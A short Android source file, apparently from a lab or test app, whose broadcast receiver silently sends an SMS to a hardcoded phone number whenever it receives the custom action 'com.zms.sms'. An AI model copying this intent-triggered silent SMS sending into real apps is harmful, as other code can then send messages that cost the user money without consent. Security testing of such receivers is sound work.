package com.example.lab418.testwebview2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

public class ExampleReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {


        if(intent.getAction().equals("com.zms.sms"))
        {
            if(intent.getIntExtra("type",-1)==0)
            {
                SmsManager.getDefault().sendTextMessage("18010823840", null, "ttttt", null, null);
            }
        }
    }
}
